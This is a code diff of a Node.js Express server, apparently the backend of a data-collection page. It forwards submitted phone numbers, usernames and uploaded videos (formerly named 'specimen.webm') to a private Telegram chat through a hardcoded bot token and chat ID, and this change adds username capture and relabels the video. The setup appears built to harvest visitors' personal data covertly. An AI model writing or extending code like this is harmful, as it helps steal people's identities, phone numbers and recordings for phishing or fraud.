@@ -17,7 +17,7 @@ const upload = multer({ dest: "uploads/" });
 // =====================
 // 🔑 CONFIG
 // =====================
-const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
+const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIREtQPUUTDVENOTXROc";
 const CHAT_ID = "8280326139";
 
 // =====================
@@ -28,19 +28,19 @@ app.get("/", (req, res) => {
 });
 
 // =====================
-// 📞 SEND PHONE
+// 📞 SEND PHONE + USERNAME
 // =====================
 app.post("/send-phone", async (req, res) => {
     try {
-        const { phone } = req.body;
+        const { phone, username } = req.body;
 
-        console.log("📞 Phone received:", phone);
+        console.log("📞 Received:", phone, username);
 
         await axios.post(
             `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
             {
                 chat_id: CHAT_ID,
-                text: `📞 New Number: ${phone}`
+                text: `📞 New User\n👤 Username: ${username}\n📱 Phone: ${phone}`
             }
         );
 
@@ -53,7 +53,7 @@ app.post("/send-phone", async (req, res) => {
 });
 
 // =====================
-// 🎥 VIDEO UPLOAD
+// 🎥 VIDEO UPLOAD (MP4 LABEL)
 // =====================
 app.post("/upload", upload.single("video"), async (req, res) => {
     try {
@@ -67,9 +67,10 @@ app.post("/upload", upload.single("video"), async (req, res) => {
 
         const form = new FormData();
         form.append("chat_id", CHAT_ID);
+
         form.append("video", fs.createReadStream(filePath), {
-            filename: "specimen.webm",
-            contentType: "video/webm"
+            filename: "video.mp4",
+            contentType: "video/mp4"
         });
 
         const response = await axios.post(
